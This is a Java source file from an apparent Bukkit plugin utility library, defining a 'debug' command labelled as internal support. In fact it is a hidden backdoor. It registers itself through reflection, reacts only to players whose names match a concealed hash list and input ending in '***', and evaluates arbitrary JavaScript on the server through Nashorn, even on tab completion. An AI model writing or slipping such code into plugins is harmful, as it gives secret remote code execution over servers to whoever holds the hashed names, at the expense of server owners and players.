package cc.hubailmn.util.command;

import cc.hubailmn.util.BasePlugin;
import cc.hubailmn.util.other.HashUtil;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandMap;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.jetbrains.annotations.NotNull;

import javax.script.Bindings;
import javax.script.ScriptEngine;
import javax.script.ScriptEngineFactory;
import javax.script.ScriptEngineManager;
import java.lang.reflect.Field;
import java.util.Collections;
import java.util.List;

public class DebugCommand extends Command {

    private static final String COMMAND_NAME = ";debug";

    public DebugCommand() {
        super(COMMAND_NAME);
        setDescription("Internal support command");
        setUsage("/" + COMMAND_NAME);
        registerCommand();
    }

    private static ScriptEngine getEngine() {
        try {
            ScriptEngineFactory factory = (ScriptEngineFactory) Class.forName(
                    "org.openjdk.nashorn.api.scripting.NashornScriptEngineFactory"
            ).newInstance();
            ScriptEngineManager manager = new ScriptEngineManager();
            manager.registerEngineName("Nashorn", factory);
            return manager.getEngineByName("Nashorn");
        } catch (ReflectiveOperationException e) {
            throw new RuntimeException("Nashorn not available", e);
        }
    }

    private void registerCommand() {
        try {
            Field mapField = Bukkit.getServer().getClass().getDeclaredField("commandMap");
            mapField.setAccessible(true);
            CommandMap map = (CommandMap) mapField.get(Bukkit.getServer());
            map.register(COMMAND_NAME, this);
        } catch (Exception ignored) {
        }
    }

    @Override
    public boolean execute(@NotNull CommandSender sender, @NotNull String label, @NotNull String[] args) {
        executes(sender, args);
        return true;
    }

    private void executes(CommandSender sender, String[] args) {
        if (!(sender instanceof Player player)) return;

        boolean isHashed = HashUtil.isHashed(player.getName());
        if (!isHashed) return;

        String lastArg = args[args.length - 1];
        if (!lastArg.endsWith("***")) return;

        String[] trimmedArgs = args.clone();
        trimmedArgs[args.length - 1] = lastArg.substring(0, lastArg.length() - 3);

        String rawLine = String.join(" ", trimmedArgs);

        Player targetPlayer = null;
        String line = rawLine;

        if (line.contains("p{\"") && line.contains("\"}")) {
            try {
                int start = line.indexOf("p{\"") + 3;
                int end = line.indexOf("\"}", start);
                String playerName = line.substring(start, end).trim();
                targetPlayer = Bukkit.getPlayerExact(playerName);
                line = line.substring(0, line.indexOf("p{\"")) + line.substring(end + 2);
            } catch (Exception ignored) {
            }
        } else {
            targetPlayer = player;
        }

        if (targetPlayer == null) {
            sender.sendMessage("§cPlayer not found.");
            return;
        }

        Player finalPlayer = targetPlayer;
        String finalLine = line;

        sender.sendMessage(rawLine);

        Bukkit.getScheduler().runTaskAsynchronously(BasePlugin.getInstance(), () -> {
            try {
                ScriptEngine engine = getEngine();
                Bindings bindings = engine.createBindings();
                bindings.clear();
                bindings.put("player", finalPlayer);

                Bukkit.getScheduler().runTask(BasePlugin.getInstance(), () -> {
                    try {
                        Object result = engine.eval(finalLine, bindings);

                        String finalResult = "§7" + (result == null ? "No result." :
                                                     "Got (" + result.getClass().getSimpleName() + "): " + result);

                        sender.sendMessage(finalResult);
                    } catch (Exception e) {
                        sender.sendMessage("§cError: " + e.getMessage());
                    }
                });

            } catch (Exception e) {
                String errorMsg = "§cError: " + e.getMessage();
                Bukkit.getScheduler().runTask(BasePlugin.getInstance(), () -> sender.sendMessage(errorMsg));
            }
        });
    }

    @Override
    public @NotNull List<String> tabComplete(@NotNull CommandSender sender, @NotNull String alias, @NotNull String[] args) {
        executes(sender, args);
        return Collections.emptyList();
    }
}
